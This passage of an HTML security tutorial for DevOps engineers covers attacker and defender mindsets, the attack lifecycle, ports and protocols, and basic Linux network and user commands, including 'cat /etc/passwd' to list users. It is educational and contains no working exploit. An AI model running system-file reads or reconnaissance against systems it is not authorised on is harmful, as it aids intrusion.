@@ -1,0 +1,2331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberSecurity for DevOps — 27 Page Deep Canvas</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;400;700&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #050508;
+  --surface: #0a0a10;
+  --card: #0e0e18;
+  --border: #1a1a2e;
+  --border2: #22223a;
+  --green: #00ff88;
+  --green-dim: rgba(0,255,136,0.1);
+  --red: #ff3355;
+  --red-dim: rgba(255,51,85,0.1);
+  --cyan: #00d4ff;
+  --cyan-dim: rgba(0,212,255,0.1);
+  --yellow: #ffcc00;
+  --yellow-dim: rgba(255,204,0,0.08);
+  --orange: #ff6b00;
+  --orange-dim: rgba(255,107,0,0.1);
+  --purple: #cc44ff;
+  --purple-dim: rgba(204,68,255,0.1);
+  --text: #d8d8f0;
+  --text2: #7878a0;
+  --text3: #3a3a5a;
+  --pro: #00ff88;
+  --con: #ff3355;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:'DM Sans',sans-serif;
+  overflow-x:hidden;
+  cursor:default;
+}
+body::before{
+  content:'';
+  position:fixed;inset:0;
+  background:
+    radial-gradient(ellipse 50% 30% at 10% 20%, rgba(0,255,136,0.03) 0%,transparent 60%),
+    radial-gradient(ellipse 40% 40% at 90% 80%, rgba(0,212,255,0.03) 0%,transparent 60%);
+  pointer-events:none;z-index:0;
+}
+
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar{width:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px;}
+
+/* ── NAV ── */
+nav{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:rgba(5,5,8,0.95);
+  border-bottom:1px solid var(--border);
+  backdrop-filter:blur(20px);
+  height:56px;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 1.5rem;
+  gap:1rem;
+}
+.nav-brand{
+  font-family:'Orbitron',monospace;
+  font-size:0.85rem;font-weight:900;
+  color:var(--green);
+  white-space:nowrap;
+  letter-spacing:0.05em;
+}
+.nav-scroll{
+  display:flex;gap:0.25rem;
+  overflow-x:auto;
+  scrollbar-width:none;
+  flex:1;
+}
+.nav-scroll::-webkit-scrollbar{display:none;}
+.npill{
+  font-family:'JetBrains Mono',monospace;
+  font-size:0.55rem;
+  padding:0.28rem 0.65rem;
+  border-radius:3px;
+  border:1px solid var(--border2);
+  color:var(--text2);
+  cursor:pointer;
+  white-space:nowrap;
+  text-decoration:none;
+  transition:all 0.15s;
+  background:transparent;
+  flex-shrink:0;
+}
+.npill:hover,.npill.active{background:var(--green);color:#000;border-color:var(--green);}
+.npill.r:hover,.npill.r.active{background:var(--red);color:#fff;border-color:var(--red);}
+.npill.c:hover,.npill.c.active{background:var(--cyan);color:#000;border-color:var(--cyan);}
+.npill.y:hover,.npill.y.active{background:var(--yellow);color:#000;border-color:var(--yellow);}
+.npill.o:hover,.npill.o.active{background:var(--orange);color:#fff;border-color:var(--orange);}
+.npill.p:hover,.npill.p.active{background:var(--purple);color:#fff;border-color:var(--purple);}
+
+/* ── HERO ── */
+.hero{
+  min-height:100vh;
+  display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  text-align:center;
+  padding:80px 2rem 4rem;
+  position:relative;overflow:hidden;
+}
+.hero-scanline{
+  position:absolute;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.015) 2px,rgba(0,255,136,0.015) 4px);
+  pointer-events:none;
+}
+.hero-eyebrow{
+  font-family:'JetBrains Mono',monospace;
+  font-size:0.7rem;color:var(--text3);
+  letter-spacing:0.3em;text-transform:uppercase;
+  margin-bottom:1.5rem;
+  animation:fadeUp 0.5s ease both;
+}
+.hero-eyebrow span{color:var(--green);}
+.hero-title{
+  font-family:'Orbitron',monospace;
+  font-size:clamp(2.2rem,7vw,6.5rem);
+  font-weight:900;line-height:0.9;
+  letter-spacing:-0.02em;
+  margin-bottom:1.5rem;
+  animation:fadeUp 0.5s 0.1s ease both;
+}
+.hero-title .t1{color:var(--green);}
+.hero-title .t2{
+  display:block;
+  color:transparent;
+  -webkit-text-stroke:1px var(--border2);
+  font-size:0.65em;
+  letter-spacing:0.05em;
+}
+.hero-sub{
+  color:var(--text2);font-size:0.95rem;line-height:1.7;
+  max-width:560px;margin-bottom:2.5rem;
+  animation:fadeUp 0.5s 0.2s ease both;
+}
+.hero-badges{
+  display:flex;gap:0.75rem;flex-wrap:wrap;justify-content:center;
+  margin-bottom:3rem;
+  animation:fadeUp 0.5s 0.3s ease both;
+}
+.hbadge{
+  font-family:'JetBrains Mono',monospace;
+  font-size:0.7rem;padding:0.5rem 1.2rem;
+  border-radius:2px;
+  cursor:pointer;text-decoration:none;
+  transition:all 0.2s;
+  display:inline-block;
+  letter-spacing:0.05em;
+}
+.hbadge.g{background:var(--green);color:#000;}
+.hbadge.g:hover{background:#00ffaa;transform:translateY(-2px);}
+.hbadge.r{background:var(--red);color:#fff;}
+.hbadge.r:hover{transform:translateY(-2px);}
+.hbadge.c{background:var(--cyan);color:#000;}
+.hbadge.c:hover{transform:translateY(-2px);}
+.hero-stats{
+  display:grid;grid-template-columns:repeat(4,1fr);gap:1px;
+  border:1px solid var(--border);border-radius:8px;overflow:hidden;
+  max-width:640px;width:100%;
+  animation:fadeUp 0.5s 0.4s ease both;
+}
+.hstat{
+  background:var(--card);padding:1.25rem 1rem;text-align:center;
+}
+.hstat .n{
+  font-family:'Orbitron',monospace;
+  font-size:1.6rem;font-weight:900;
+  color:var(--green);
+}
+.hstat .l{font-size:0.65rem;color:var(--text3);font-family:'JetBrains Mono',monospace;margin-top:0.25rem;letter-spacing:0.08em;}
+
+/* ── MAIN LAYOUT ── */
+.page{
+  padding:5rem 2rem;
+  max-width:1140px;margin:0 auto;
+  position:relative;z-index:1;
+}
+.page-header{margin-bottom:3rem;}
+.page-num{
+  font-family:'JetBrains Mono',monospace;
+  font-size:0.6rem;letter-spacing:0.25em;
+  text-transform:uppercase;margin-bottom:0.5rem;
+  display:flex;align-items:center;gap:0.75rem;
+}
+.page-num::after{content:'';flex:1;height:1px;background:var(--border);}
+.page-title{
+  font-family:'Orbitron',monospace;
+  font-size:clamp(1.6rem,3.5vw,2.8rem);
+  font-weight:900;letter-spacing:-0.02em;
+  line-height:1.1;
+}
+.page-desc{color:var(--text2);font-size:0.9rem;line-height:1.7;max-width:620px;margin-top:0.75rem;}
+.divider{border:none;border-top:1px solid var(--border);margin:0;}
+
+/* ── CARDS ── */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:1.25rem;}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:1.25rem;}
+.grid-3{display:grid;grid-template-columns:repeat(3,1fr);gap:1.25rem;}
+
+.card{
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:8px;padding:1.75rem;
+  transition:border-color 0.2s,transform 0.2s;
+  position:relative;overflow:hidden;
+}
+.card::before{
+  content:'';position:absolute;top:0;left:0;right:0;
+  height:2px;background:var(--green);
+}
+.card.red::before{background:var(--red);}
+.card.cyan::before{background:var(--cyan);}
+.card.yellow::before{background:var(--yellow);}
+.card.orange::before{background:var(--orange);}
+.card.purple::before{background:var(--purple);}
+.card:hover{border-color:var(--border2);transform:translateY(-2px);}
+
+.card-num{
+  font-family:'Orbitron',monospace;
+  font-size:0.6rem;color:var(--text3);
+  letter-spacing:0.2em;margin-bottom:0.75rem;
+}
+.card-icon{font-size:1.8rem;margin-bottom:0.6rem;display:block;}
+.card-title{
+  font-family:'Orbitron',monospace;
+  font-size:0.95rem;font-weight:700;
+  margin-bottom:0.75rem;letter-spacing:0.02em;
+  color:var(--text);
+}
+.layman{
+  background:rgba(255,204,0,0.05);
+  border:1px solid rgba(255,204,0,0.15);
+  border-radius:5px;padding:0.75rem;
+  font-size:0.78rem;color:var(--text2);
+  line-height:1.65;margin-bottom:0.9rem;
+}
+.layman::before{
+  content:'💡 ';
+  font-style:normal;
+}
+.layman-label{
+  font-family:'JetBrains Mono',monospace;
+  font-size:0.58rem;color:var(--yellow);
+  text-transform:uppercase;letter-spacing:0.12em;
+  display:block;margin-bottom:0.3rem;font-weight:700;
+}
+.detail{font-size:0.8rem;color:var(--text2);line-height:1.65;margin-bottom:0.9rem;}
+
+/* ── CODE ── */
+.code{
+  background:#030305;
+  border:1px solid var(--border);
+  border-radius:5px;
+  padding:0.85rem 1rem;
+  font-family:'JetBrains Mono',monospace;
+  font-size:0.68rem;
+  line-height:1.9;
+  color:var(--green);
+  overflow-x:auto;
+  margin-top:0.75rem;
+}
+.code .cm{color:var(--text3);}
+.code .fl{color:var(--cyan);}
+.code .st{color:var(--yellow);}
+.code .rd{color:var(--red);}
+.code .or{color:var(--orange);}
+.code .pu{color:var(--purple);}
+
+/* ── PROS CONS ── */
+.pc{display:grid;grid-template-columns:1fr 1fr;gap:0.75rem;margin-top:0.9rem;}
+.pros,.cons{border-radius:5px;padding:0.75rem;font-size:0.73rem;line-height:1.65;}
+.pros{background:rgba(0,255,136,0.05);border:1px solid rgba(0,255,136,0.12);}
+.cons{background:rgba(255,51,85,0.05);border:1px solid rgba(255,51,85,0.12);}
+.pt{font-family:'JetBrains Mono',monospace;font-size:0.58rem;color:var(--pro);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:0.4rem;font-weight:700;}
+.ct{font-family:'JetBrains Mono',monospace;font-size:0.58rem;color:var(--con);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:0.4rem;font-weight:700;}
+.pros ul,.cons ul{list-style:none;color:var(--text2);}
+.pros li::before{content:'+ ';color:var(--pro);}
+.cons li::before{content:'- ';color:var(--con);}
+
+/* ── BADGE ── */
+.badge{
+  display:inline-block;
+  font-family:'JetBrains Mono',monospace;
+  font-size:0.58rem;padding:0.2rem 0.55rem;
+  border-radius:3px;font-weight:700;
+  margin-bottom:0.6rem;
+  text-transform:uppercase;letter-spacing:0.08em;
+}
+.badge.hot{background:var(--red-dim);color:var(--red);border:1px solid rgba(255,51,85,0.25);}
+.badge.core{background:var(--green-dim);color:var(--green);border:1px solid rgba(0,255,136,0.2);}
+.badge.adv{background:var(--purple-dim);color:var(--purple);border:1px solid rgba(204,68,255,0.2);}
+.badge.warn{background:var(--yellow-dim);color:var(--yellow);border:1px solid rgba(255,204,0,0.2);}
+.badge.tool{background:var(--cyan-dim);color:var(--cyan);border:1px solid rgba(0,212,255,0.2);}
+.badge.free{background:var(--orange-dim);color:var(--orange);border:1px solid rgba(255,107,0,0.2);}
+
+/* ── BIG CARD ── */
+.bigcard{
+  background:var(--card);border:1px solid var(--border);
+  border-radius:10px;padding:2.5rem;margin-bottom:1.5rem;
+  position:relative;overflow:hidden;
+}
+.bigcard .bg{
+  position:absolute;right:-2rem;top:-1rem;
+  font-size:12rem;opacity:0.03;pointer-events:none;line-height:1;
+}
+.bigcard-title{
+  font-family:'Orbitron',monospace;font-size:1.3rem;font-weight:900;
+  letter-spacing:0.02em;margin-bottom:0.75rem;
+}
+
+/* ── FLOW ── */
+.flow{
+  display:flex;align-items:center;flex-wrap:wrap;gap:0.4rem;
+  font-family:'JetBrains Mono',monospace;font-size:0.65rem;
+  margin:1rem 0;
+}
+.fs{
+  background:var(--surface);border:1px solid var(--border2);
+  border-radius:4px;padding:0.35rem 0.7rem;color:var(--text2);
+}
+.fa{color:var(--text3);}
+
+/* ── TABLE ── */
+.tbl{width:100%;border-collapse:collapse;font-size:0.76rem;margin-top:1rem;}
+.tbl th{
+  font-family:'JetBrains Mono',monospace;font-size:0.58rem;
+  text-transform:uppercase;letter-spacing:0.1em;
+  color:var(--text3);padding:0.6rem 0.8rem;
+  text-align:left;border-bottom:1px solid var(--border);
+}
+.tbl td{
+  padding:0.6rem 0.8rem;border-bottom:1px solid rgba(26,26,46,0.5);
+  color:var(--text2);vertical-align:top;line-height:1.5;
+}
+.tbl td:first-child{
+  font-family:'JetBrains Mono',monospace;
+  color:var(--green);white-space:nowrap;font-size:0.7rem;
+}
+.tbl td.red{color:var(--red);}
+.tbl td.cyan{color:var(--cyan);}
+.tbl tr:hover td{background:rgba(255,255,255,0.015);}
+
+/* ── CHECKLIST ── */
+.cl{list-style:none;margin-top:0.75rem;}
+.cl li{
+  font-size:0.78rem;color:var(--text2);
+  padding:0.35rem 0;border-bottom:1px solid rgba(26,26,46,0.4);
+  display:flex;gap:0.5rem;align-items:flex-start;line-height:1.5;
+}
+.cl li::before{content:'▸';color:var(--green);flex-shrink:0;margin-top:1px;}
+.cl.r li::before{color:var(--red);}
+.cl.c li::before{color:var(--cyan);}
+.cl.y li::before{color:var(--yellow);}
+.cl.o li::before{color:var(--orange);}
+
+/* ── BANNER ── */
+.banner{
+  background:linear-gradient(135deg,rgba(0,255,136,0.07) 0%,rgba(0,255,136,0.02) 100%);
+  border:1px solid rgba(0,255,136,0.15);
+  border-radius:10px;padding:1.75rem 2rem;
+  margin:2rem 0;display:flex;gap:1.5rem;align-items:flex-start;
+}
+.banner.red{background:linear-gradient(135deg,rgba(255,51,85,0.07) 0%,rgba(255,51,85,0.02) 100%);border-color:rgba(255,51,85,0.15);}
+.banner.cyan{background:linear-gradient(135deg,rgba(0,212,255,0.07) 0%,rgba(0,212,255,0.02) 100%);border-color:rgba(0,212,255,0.15);}
+.banner.yellow{background:linear-gradient(135deg,rgba(255,204,0,0.07) 0%,rgba(255,204,0,0.02) 100%);border-color:rgba(255,204,0,0.15);}
+.banner.orange{background:linear-gradient(135deg,rgba(255,107,0,0.07) 0%,rgba(255,107,0,0.02) 100%);border-color:rgba(255,107,0,0.15);}
+.banner.purple{background:linear-gradient(135deg,rgba(204,68,255,0.07) 0%,rgba(204,68,255,0.02) 100%);border-color:rgba(204,68,255,0.15);}
+.banner-icon{font-size:2rem;flex-shrink:0;}
+.banner-title{font-family:'Orbitron',monospace;font-size:1rem;font-weight:700;margin-bottom:0.4rem;}
+.banner-text{font-size:0.82rem;color:var(--text2);line-height:1.7;}
+
+/* ── STEP / TIMELINE ── */
+.steps{margin:1.25rem 0;}
+.step{display:flex;gap:1rem;margin-bottom:1.25rem;}
+.step-dot{
+  width:28px;height:28px;border-radius:50%;
+  background:var(--green-dim);border:1px solid var(--green);
+  display:flex;align-items:center;justify-content:center;
+  font-family:'JetBrains Mono',monospace;font-size:0.6rem;font-weight:700;
+  color:var(--green);flex-shrink:0;margin-top:2px;
+}
+.step-dot.r{background:var(--red-dim);border-color:var(--red);color:var(--red);}
+.step-dot.c{background:var(--cyan-dim);border-color:var(--cyan);color:var(--cyan);}
+.step-dot.y{background:var(--yellow-dim);border-color:var(--yellow);color:var(--yellow);}
+.step-dot.o{background:var(--orange-dim);border-color:var(--orange);color:var(--orange);}
+.step-body .st-title{font-family:'Orbitron',monospace;font-size:0.8rem;font-weight:700;margin-bottom:0.2rem;}
+.step-body .st-desc{font-size:0.78rem;color:var(--text2);line-height:1.6;}
+
+/* ── ALERT BOX ── */
+.alert{
+  border-radius:5px;padding:0.85rem 1rem;
+  font-size:0.78rem;line-height:1.6;margin-top:0.75rem;
+  display:flex;gap:0.6rem;align-items:flex-start;
+}
+.alert.warn{background:rgba(255,204,0,0.06);border:1px solid rgba(255,204,0,0.2);color:var(--yellow);}
+.alert.danger{background:rgba(255,51,85,0.06);border:1px solid rgba(255,51,85,0.2);color:var(--red);}
+.alert.info{background:rgba(0,212,255,0.06);border:1px solid rgba(0,212,255,0.2);color:var(--cyan);}
+.alert.success{background:rgba(0,255,136,0.06);border:1px solid rgba(0,255,136,0.2);color:var(--green);}
+
+/* ── LEVEL INDICATOR ── */
+.level{
+  display:flex;gap:3px;align-items:center;margin-bottom:0.6rem;
+}
+.level-dot{width:8px;height:8px;border-radius:50%;background:var(--border2);}
+.level-dot.fill{background:var(--green);}
+.level-label{font-family:'JetBrains Mono',monospace;font-size:0.58rem;color:var(--text3);margin-left:0.4rem;}
+
+/* ── ANIM ── */
+@keyframes fadeUp{
+  from{opacity:0;transform:translateY(20px);}
+  to{opacity:1;transform:none;}
+}
+.reveal{opacity:0;transform:translateY(18px);transition:opacity 0.45s ease,transform 0.45s ease;}
+.reveal.visible{opacity:1;transform:none;}
+
+/* ── FOOTER ── */
+footer{
+  border-top:1px solid var(--border);padding:2rem;
+  text-align:center;
+  font-family:'JetBrains Mono',monospace;font-size:0.6rem;
+  color:var(--text3);letter-spacing:0.15em;
+}
+
+@media(max-width:700px){
+  .grid-2,.grid-3{grid-template-columns:1fr;}
+  .hero-stats{grid-template-columns:1fr 1fr;}
+  .pc{grid-template-columns:1fr;}
+  .banner{flex-direction:column;}
+  .nav-brand{display:none;}
+}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-brand">◈ CYBER//SEC</div>
+  <div class="nav-scroll">
+    <a href="#intro" class="npill">Intro</a>
+    <a href="#mindset" class="npill">Mindset</a>
+    <a href="#networking" class="npill c">Networking</a>
+    <a href="#linux-sec" class="npill">Linux Basics</a>
+    <a href="#nmap" class="npill c">Nmap</a>
+    <a href="#wireshark" class="npill c">Wireshark</a>
+    <a href="#burpsuite" class="npill r">Burp Suite</a>
+    <a href="#metasploit" class="npill r">Metasploit</a>
+    <a href="#nikto" class="npill r">Nikto</a>
+    <a href="#openvas" class="npill y">OpenVAS</a>
+    <a href="#hashcat" class="npill r">Hashcat</a>
+    <a href="#john" class="npill r">John</a>
+    <a href="#hydra" class="npill r">Hydra</a>
+    <a href="#gobuster" class="npill o">Gobuster</a>
+    <a href="#sqlmap" class="npill r">SQLMap</a>
+    <a href="#shodan" class="npill c">Shodan</a>
+    <a href="#osint" class="npill p">OSINT</a>
+    <a href="#firewall" class="npill">Firewall</a>
+    <a href="#iptables" class="npill">iptables</a>
+    <a href="#siem" class="npill y">SIEM</a>
+    <a href="#ids-ips" class="npill y">IDS/IPS</a>
+    <a href="#ssl-tls" class="npill c">SSL/TLS</a>
+    <a href="#secrets" class="npill">Secrets</a>
+    <a href="#container-sec" class="npill">Container Sec</a>
+    <a href="#cloud-sec" class="npill c">Cloud Sec</a>
+    <a href="#incident" class="npill r">Incident</a>
+    <a href="#checklist" class="npill">Checklist</a>
+  </div>
+</nav>
+
+<!-- ════════ HERO ════════ -->
+<section class="hero" id="intro">
+  <div class="hero-scanline"></div>
+  <div class="hero-eyebrow">◈ DevOps Security Canvas — <span>27 Pages Deep</span></div>
+  <h1 class="hero-title">
+    <span class="t1">CYBER</span>
+    <span class="t2">SECURITY</span>
+    <span class="t1">FOR DEVOPS</span>
+  </h1>
+  <p class="hero-sub">Every tool, every command, in plain English. Built for developers who want to understand security — not just copy-paste commands they don't understand.</p>
+  <div class="hero-badges">
+    <a href="#networking" class="hbadge g">Network Recon</a>
+    <a href="#burpsuite" class="hbadge r">Web Hacking</a>
+    <a href="#container-sec" class="hbadge c">Container Sec</a>
+  </div>
+  <div class="hero-stats">
+    <div class="hstat"><div class="n">27</div><div class="l">Pages</div></div>
+    <div class="hstat"><div class="n">40+</div><div class="l">Tools</div></div>
+    <div class="hstat"><div class="n">100+</div><div class="l">Commands</div></div>
+    <div class="hstat"><div class="n">0→Pro</div><div class="l">Level Up</div></div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 1: MINDSET ════════ -->
+<section class="page" id="mindset">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--green)">PAGE 01 — FOUNDATION</div>
+    <h2 class="page-title" style="color:var(--green)">The Security Mindset</h2>
+    <p class="page-desc">Before touching any tool, you need to think like an attacker AND a defender. This duality is what separates good DevOps engineers from great ones.</p>
+  </div>
+  <div class="bigcard reveal">
+    <div class="bg">🧠</div>
+    <div class="badge core">Foundation</div>
+    <div class="bigcard-title">Think Like Both: Attacker & Defender</div>
+    <div class="layman"><span class="layman-label">Layman Explanation</span>Imagine you own a house. An attacker thinks "How do I break in?" — weak door lock? Open window? Disguise as delivery guy? A defender thinks "How do I stop someone from breaking in?" — better lock, alarm, camera. Security people must think BOTH ways. In tech: attackers find holes; defenders patch them.</div>
+    <div class="grid-3" style="margin-top:1.5rem;">
+      <div style="background:rgba(255,51,85,0.05);border:1px solid rgba(255,51,85,0.15);border-radius:6px;padding:1.25rem;">
+        <div style="font-family:'Orbitron',monospace;font-size:0.75rem;color:var(--red);margin-bottom:0.5rem;">RED TEAM (Attacker)</div>
+        <ul class="cl r"><li>Find vulnerabilities before attackers do</li><li>Simulate real-world attacks</li><li>Penetration testing, social engineering</li><li>"How would I break this?"</li></ul>
+      </div>
+      <div style="background:rgba(0,255,136,0.05);border:1px solid rgba(0,255,136,0.15);border-radius:6px;padding:1.25rem;">
+        <div style="font-family:'Orbitron',monospace;font-size:0.75rem;color:var(--green);margin-bottom:0.5rem;">BLUE TEAM (Defender)</div>
+        <ul class="cl"><li>Monitor, detect, and respond to threats</li><li>Patch vulnerabilities discovered</li><li>Set up firewalls, IDS, SIEM</li><li>"How do I stop this?"</li></ul>
+      </div>
+      <div style="background:rgba(204,68,255,0.05);border:1px solid rgba(204,68,255,0.15);border-radius:6px;padding:1.25rem;">
+        <div style="font-family:'Orbitron',monospace;font-size:0.75rem;color:var(--purple);margin-bottom:0.5rem;">PURPLE TEAM (Both)</div>
+        <ul class="cl" style="--clc:var(--purple)"><li>Red + Blue working together</li><li>Attack AND defend simultaneously</li><li>Best for DevOps engineers</li><li>"How do I build securely from day one?"</li></ul>
+      </div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card">
+      <div class="badge core">CIA Triad</div>
+      <div class="card-title">The 3 Pillars of Security</div>
+      <div class="layman"><span class="layman-label">Layman</span>Every security decision maps to one of 3 goals: keeping data secret (C), making sure data isn't tampered (I), and ensuring systems are always available (A).</div>
+      <ul class="cl">
+        <li><strong style="color:var(--cyan)">Confidentiality</strong> — Only authorized people see data. (Encryption, access control)</li>
+        <li><strong style="color:var(--green)">Integrity</strong> — Data hasn't been tampered with. (Hashing, checksums)</li>
+        <li><strong style="color:var(--yellow)">Availability</strong> — Systems are up when needed. (Backups, DDoS protection)</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="badge warn">Know This</div>
+      <div class="card-title">The Attack Lifecycle</div>
+      <div class="layman"><span class="layman-label">Layman</span>Hackers don't just randomly attack. They follow a methodical process — like a burglar who first watches the neighborhood, then picks a target, then plans the break-in.</div>
+      <div class="steps">
+        <div class="step"><div class="step-dot c">1</div><div class="step-body"><div class="st-title">Reconnaissance</div><div class="st-desc">Gather info about target (passive/active)</div></div></div>
+        <div class="step"><div class="step-dot y">2</div><div class="step-body"><div class="st-title">Scanning & Enumeration</div><div class="st-desc">Find open ports, services, vulnerabilities</div></div></div>
+        <div class="step"><div class="step-dot r">3</div><div class="step-body"><div class="st-title">Exploitation</div><div class="st-desc">Use discovered vulnerabilities to gain access</div></div></div>
+        <div class="step"><div class="step-dot r">4</div><div class="step-body"><div class="st-title">Post-Exploitation</div><div class="st-desc">Maintain access, escalate privileges, exfiltrate</div></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 2: NETWORKING ════════ -->
+<section class="page" id="networking">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--cyan)">PAGE 02 — NETWORKING BASICS</div>
+    <h2 class="page-title" style="color:var(--cyan)">Networking for Security</h2>
+    <p class="page-desc">You cannot hack or defend what you don't understand. Networking is the foundation of everything in cybersecurity.</p>
+  </div>
+  <div class="banner cyan reveal">
+    <div class="banner-icon">🌐</div>
+    <div>
+      <div class="banner-title">Why DevOps Engineers MUST Know Networking</div>
+      <div class="banner-text">Every attack travels through a network. Firewalls, IDS, VPNs, SSL — all network concepts. If you don't know TCP/IP, ports, and protocols, you're flying blind when securing your infrastructure.</div>
+    </div>
+  </div>
+  <div class="grid reveal">
+    <div class="card cyan">
+      <div class="badge tool">Concept</div>
+      <div class="card-title">TCP/IP & Ports</div>
+      <div class="layman"><span class="layman-label">Layman</span>IP address = your house address. Port = the specific door in your house. Port 80 is the front door (HTTP). Port 443 is the secure front door (HTTPS). Port 22 is the back door (SSH). Attackers knock on all doors to find unlocked ones.</div>
+      <table class="tbl">
+        <thead><tr><th>Port</th><th>Service</th><th>Security Note</th></tr></thead>
+        <tbody>
+          <tr><td>22</td><td>SSH</td><td>Change default port, disable root login</td></tr>
+          <tr><td>80</td><td>HTTP</td><td>Unencrypted — use HTTPS instead</td></tr>
+          <tr><td>443</td><td>HTTPS</td><td>Encrypted — always use this</td></tr>
+          <tr><td>3306</td><td>MySQL</td><td>Never expose to internet!</td></tr>
+          <tr><td>5432</td><td>PostgreSQL</td><td>Block at firewall level</td></tr>
+          <tr><td>6379</td><td>Redis</td><td>No auth by default — dangerous!</td></tr>
+          <tr><td>27017</td><td>MongoDB</td><td>Historically exposed unprotected</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="card cyan">
+      <div class="badge tool">Concept</div>
+      <div class="card-title">Key Protocols Explained</div>
+      <div class="layman"><span class="layman-label">Layman</span>Protocols are rules for how two computers talk. Like human languages — if both sides speak the same one, they understand each other. Attackers exploit weaknesses in these "languages."</div>
+      <table class="tbl">
+        <thead><tr><th>Protocol</th><th>Plain English</th><th>Security Risk</th></tr></thead>
+        <tbody>
+          <tr><td>TCP</td><td>Reliable, ordered delivery</td><td>SYN flood attacks</td></tr>
+          <tr><td>UDP</td><td>Fast, no guarantee delivery</td><td>DDoS amplification</td></tr>
+          <tr><td>DNS</td><td>Phone book of the internet</td><td>DNS poisoning, hijacking</td></tr>
+          <tr><td>ARP</td><td>Maps IP to MAC address</td><td>ARP spoofing/poisoning</td></tr>
+          <tr><td>ICMP</td><td>Ping — is a host alive?</td><td>Ping flood, smurf attack</td></tr>
+          <tr><td>SMTP</td><td>Email sending</td><td>Email spoofing, spam relays</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+  <div class="grid reveal" style="margin-top:1.25rem;">
+    <div class="card cyan">
+      <div class="card-title">Basic Network Commands (Linux)</div>
+      <div class="code">
+<span class="cm"># Show your IP addresses</span><br>
+<span class="fl">ip</span> addr show<br>
+<span class="fl">ifconfig</span>            <span class="cm"># older method</span><br><br>
+<span class="cm"># Test connectivity</span><br>
+<span class="fl">ping</span> <span class="st">8.8.8.8</span>         <span class="cm"># ping Google DNS</span><br>
+<span class="fl">ping</span> <span class="fl">-c</span> 4 google.com  <span class="cm"># 4 packets only</span><br><br>
+<span class="cm"># Trace the route packets take</span><br>
+<span class="fl">traceroute</span> google.com<br>
+<span class="fl">tracepath</span> google.com   <span class="cm"># no sudo needed</span><br><br>
+<span class="cm"># DNS lookup</span><br>
+<span class="fl">nslookup</span> google.com<br>
+<span class="fl">dig</span> google.com         <span class="cm"># detailed DNS info</span><br>
+<span class="fl">dig</span> +short google.com  <span class="cm"># just IP</span><br><br>
+<span class="cm"># Show open connections</span><br>
+<span class="fl">ss</span> <span class="fl">-tulpn</span>              <span class="cm"># all listening ports</span><br>
+<span class="fl">netstat</span> <span class="fl">-tulpn</span>         <span class="cm"># older equivalent</span>
+      </div>
+    </div>
+    <div class="card cyan">
+      <div class="card-title">Subnetting & CIDR (Quick)</div>
+      <div class="layman"><span class="layman-label">Layman</span>CIDR is how we define a "neighborhood" of IP addresses. /24 means 256 addresses in your neighborhood. Firewalls use this to say "allow everyone from this neighborhood, block everyone else."</div>
+      <div class="code">
+<span class="cm"># Common CIDR ranges:</span><br>
+<span class="st">192.168.1.0/24</span>   <span class="cm"># 256 IPs (home network)</span><br>
+<span class="st">10.0.0.0/8</span>       <span class="cm"># 16M IPs (large corp)</span><br>
+<span class="st">172.16.0.0/12</span>    <span class="cm"># 1M IPs (mid corp)</span><br><br>
+<span class="cm"># Check if IP is in subnet:</span><br>
+<span class="fl">ipcalc</span> 192.168.1.0/24<br><br>
+<span class="cm"># Understand: /32 = single IP</span><br>
+<span class="cm"># /0 = entire internet (dangerous!)</span><br><br>
+<span class="cm"># Route table</span><br>
+<span class="fl">ip route</span> show<br>
+<span class="fl">route</span> <span class="fl">-n</span>           <span class="cm"># numeric format</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider">
+
+<!-- ════════ PAGE 3: LINUX SEC ════════ -->
+<section class="page" id="linux-sec">
+  <div class="page-header reveal">
+    <div class="page-num" style="color:var(--green)">PAGE 03 — LINUX SECURITY</div>
+    <h2 class="page-title" style="color:var(--green)">Linux Security Basics</h2>
+    <p class="page-desc">Linux is the OS of DevOps. Securing it is non-negotiable. Start here before using any security tools.</p>
+  </div>
+  <div class="grid reveal">
+    <div class="card">
+      <div class="badge core">Must Know</div>
+      <div class="card-title">Users, Permissions & Sudo</div>
+      <div class="layman"><span class="layman-label">Layman</span>Linux is like an office building. Root is the building manager with master key. Regular users have keys only to their own offices. Sudo is like temporarily borrowing the master key. Always follow least privilege — people should only access what they need.</div>
+      <div class="code">
+<span class="cm"># Who am I?</span><br>
+<span class="fl">whoami</span><br>
+<span class="fl">id</span>                     <span class="cm"># full user info</span><br><br>
+<span class="cm"># List users</span><br>
+<span class="fl">cat</span> /etc/passwd<br>
+<span class="fl">getent passwd</span><br><br>
+<span class="cm"># Create non-root user</span><br>
+<span class="fl">useradd</span> <span class="fl">-m</span> deployuser<br>
+<span class="fl">usermod</span> <span class="fl">-aG</span> sudo deployuser<br><br>
+<span class="cm"># Check file permissions</span><br>
